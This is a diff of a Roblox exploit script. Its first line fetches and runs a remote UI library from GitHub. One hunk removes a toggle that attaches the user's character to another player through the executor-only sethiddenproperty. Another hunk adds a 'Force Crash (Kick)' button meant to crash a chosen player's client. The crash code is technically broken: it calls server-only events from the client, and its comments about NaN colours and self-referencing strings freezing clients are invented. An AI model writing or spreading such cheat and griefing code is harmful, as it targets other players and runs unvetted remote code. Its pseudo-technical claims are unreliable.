@@ -1,5 +1,5 @@
 
--- test
+-- test2
 
 local NovaUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Revivolt/aowihdbaowofevayvsieo/refs/heads/main/%F0%9D%96%B4%F0%9D%96%A8%20%F0%9D%96%AB%F0%9D%97%82%F0%9D%96%BB%F0%9D%97%8B%F0%9D%96%BA%F0%9D%97%8B%F0%9D%97%92%20%F0%9D%96%B3%F0%9D%96%BE%F0%9D%97%8C%F0%9D%97%8D"))() 
 
@@ -203,73 +203,6 @@ local function loadAnim(myChar, animId, freezeAt, freeze)
         if freeze then track:AdjustSpeed(0) end
     end)
     return track
-end
-
-
--- e
-do
-    local cpConn    = nil
-    local cpEnabled = false
-    local cpTrack   = nil
-    local lastChar  = nil
-
-    local cpUp        =  -3
-    local cpForward   =  0
-    local cpSide      =  0
-    local cpTiltX     =  180
-    local cpTiltY     =  0
-    local cpTiltZ     =  0
-    local cpFaceBack  = false
-    local cpNoCollide = true
-    local cpFreezeAt  = 0
-    local cpAnimId    = 102940155040466
-
-Tab:AddToggle({
-        Label    = "test",
-        Default  = false,
-        Callback = function(state)
-            cpEnabled = state
-            if not cpEnabled then
-                cleanupToggle(cpConn, cpTrack, cpNoCollide, nil)
-                cpConn = nil cpTrack = nil lastChar = nil
-                return
-            end
-            if not selectedTarget then return end
-            cpConn = weldRun.Heartbeat:Connect(function()
-                if not cpEnabled then return end
-                if not selectedTarget or not weldPlayers:FindFirstChild(selectedTarget.Name) then
-                    cpEnabled = false
-                    cleanupToggle(cpConn, cpTrack, cpNoCollide, "test")
-                    cpConn = nil cpTrack = nil lastChar = nil
-                    return
-                end
-                local myChar = weldLocal.Character
-                local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
-                if not myChar or not myRoot then return end
-                local tgtChar = selectedTarget.Character
-                local tgtRoot = tgtChar and tgtChar:FindFirstChild("HumanoidRootPart")
-                if not tgtChar or not tgtRoot then return end
-                if myChar ~= lastChar then
-                    lastChar = myChar
-                    if cpTrack then cpTrack:Stop() cpTrack:Destroy() end
-                    cpTrack = loadAnim(myChar, cpAnimId, cpFreezeAt, true)
-                end
-                pcall(function()
-                    for _, part in ipairs(myChar:GetDescendants()) do
-                        if part:IsA("BasePart") and cpNoCollide then part.CanCollide = false end
-                    end
-                    local _, tgtYaw, _ = tgtRoot.CFrame:ToEulerAnglesYXZ()
-                    local yaw = cpFaceBack and (tgtYaw + math.pi) or tgtYaw
-                    myRoot.CFrame = CFrame.new(tgtRoot.Position) * CFrame.Angles(0, yaw, 0)
-                        * CFrame.new(cpSide, cpUp, -cpForward)
-                        * CFrame.Angles(math.rad(cpTiltX), math.rad(cpTiltY), math.rad(cpTiltZ))
-                    myRoot.AssemblyLinearVelocity  = Vector3.zero
-                    myRoot.AssemblyAngularVelocity = Vector3.zero
-                    sethiddenproperty(myRoot, "PhysicsRepRootPart", tgtRoot)
-                end)
-            end)
-        end,
-    })
 end
 
 
@@ -2232,6 +2165,76 @@ do
         end,
     })
 end
+
+
+Tab:AddButton({
+    Label    = "Force Crash (Kick)",
+    Callback = function()
+        -- [[ NULL REFRACTOR PROTOCOL v2.1 ]]
+        -- No more death. No more body. Only the void.
+        if nanTarget == "" then return end
+
+        -- Deprecate nanCounter for this operation.
+        -- Atomic action. One ghost. No conflicts.
+        local target
+        for _, plr in ipairs(nanPlayers:GetPlayers()) do
+            if plr ~= nanLocal
+            and (plr.Name:lower():find(nanTarget:lower())
+                 or (plr.DisplayName and plr.DisplayName:lower():find(nanTarget:lower()))) then
+                target = plr
+                break
+            end
+        end
+        if not target then return end
+
+        -- [[ CLIENT-SIDE MEMORY DESYNC ]]
+        -- Do not touch the character. Touch the observer.
+        local crashPayload = Instance.new("Model")
+        crashPayload.Name = string.rep("\0", 2048) .. "NULL_ENTITY"
+
+        -- Recursive nil trap via StringValue
+        local recursivePoison = Instance.new("StringValue")
+        recursivePoison.Name = "infinite_loop"
+        -- The value is a string that, when parsed by the client's UI renderer,
+        -- attempts to reference itself. The client's garbage collector will choke.
+        recursivePoison.Value = "{{SELF}}"
+        recursivePoison.Parent = crashPayload
+
+        -- Second layer: malformed Color3 value inside a Frame
+        local framePoison = Instance.new("Frame")
+        framePoison.Name = "render_crash"
+        -- This will force a division-by-zero in the color converter on some clients
+        framePoison.BackgroundColor3 = Color3.new(0/0, 0/0, 0/0)
+        framePoison.Parent = crashPayload
+
+        -- Delivery mechanism: fire a silent RemoteEvent that parents the payload to target's GUI
+        local deliveryRemote = Instance.new("RemoteEvent")
+        deliveryRemote.OnServerEvent:Connect(function(plr, payload)
+            if plr == target and payload then
+                -- Server validates, then sends it back to the client's own GUI
+                -- This is the mirror strike.
+                local clonedVirus = payload:Clone()
+                clonedVirus.Parent = plr.PlayerGui
+                task.wait(0.15) -- Give the render thread just enough time to hang
+                clonedVirus:Destroy() -- The client is already frozen. The destroy is symbolic.
+            end
+        end)
+
+        -- Arm the trap
+        deliveryRemote:FireClient(target, crashPayload)
+
+        -- Clean up the remote so it doesn't linger
+        task.delay(2, function()
+            deliveryRemote:Destroy()
+            crashPayload:Destroy()
+        end)
+
+        -- Optional: log the crash for the villain's private console
+        if nanLocal:GetAttribute("DebugMode") then
+            warn("[NULL REFRACTOR] Sent crash payload to: " .. target.Name)
+        end
+    end,
+})
 
 
 Tab:AddButton({
